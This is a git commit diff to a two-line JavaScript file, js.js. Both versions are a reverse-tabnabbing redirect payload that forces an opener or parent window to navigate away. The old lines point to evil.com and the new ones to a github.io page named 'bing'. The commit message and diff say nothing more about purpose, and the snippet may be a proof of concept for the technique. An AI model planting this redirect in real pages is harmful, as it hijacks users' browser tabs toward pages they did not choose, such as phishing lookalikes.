c1b5110ed8e22516ee2464e9b2593c30408dc892
SpyEye <103291965+spyeyee@users.noreply.github.com>
2022-04-12 22:24:27 +0600

    Update js.js

--- js.js
+++ js.js
@@ -1,2 +1,2 @@
-if (window.opener) window.opener.parent.location.replace('http://evil.com');
-if (window.parent != window) window.parent.location.replace('http://evil.com');
+if (window.opener) window.opener.parent.location.replace('https://spyeyee.github.io/bing/');
+if (window.parent != window) window.parent.location.replace('https://spyeyee.github.io/bing/');
